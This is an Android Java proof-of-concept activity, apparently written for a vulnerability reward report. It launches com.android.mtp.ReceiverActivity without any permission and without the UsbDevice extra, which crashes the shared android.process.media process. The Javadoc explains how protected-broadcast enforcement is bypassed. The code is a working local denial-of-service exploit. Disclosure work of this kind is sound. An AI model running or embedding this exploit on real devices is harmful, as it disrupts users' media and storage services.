package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

/**
 * Zero-permission PoC for com.android.mtp.ReceiverActivity.
 *
 * android.hardware.usb.action.USB_DEVICE_ATTACHED is a protected broadcast (a zero-perm app
 * cannot sendBroadcast() it -- confirmed via SecurityException even from shell), but
 * ReceiverActivity matches that SAME action string in its <intent-filter> as an ACTIVITY, not
 * a receiver. Protected-broadcast enforcement only gates Context.sendBroadcast() delivery; it
 * has no effect on startActivity() intent resolution. Since ReceiverActivity itself declares no
 * android:permission, any zero-perm app can launch it directly and supply (or omit) the
 * "device" UsbDevice extra it blindly trusts, crashing the shared android.process.media process
 * with a NullPointerException when the extra is absent.
 */
public class MtpReceiverCrashActivity extends Activity {
    private static final String TAG = "VRP-MtpCrash";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            Intent i = new Intent("android.hardware.usb.action.USB_DEVICE_ATTACHED");
            i.setComponent(new ComponentName("com.android.mtp", "com.android.mtp.ReceiverActivity"));
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // Deliberately omit the "device" UsbDevice extra.
            startActivity(i);
            Log.i(TAG, "startActivity() on ReceiverActivity returned normally (no SecurityException)");
        } catch (Exception e) {
            Log.e(TAG, "startActivity threw: " + e);
        }
        finish();
    }
}
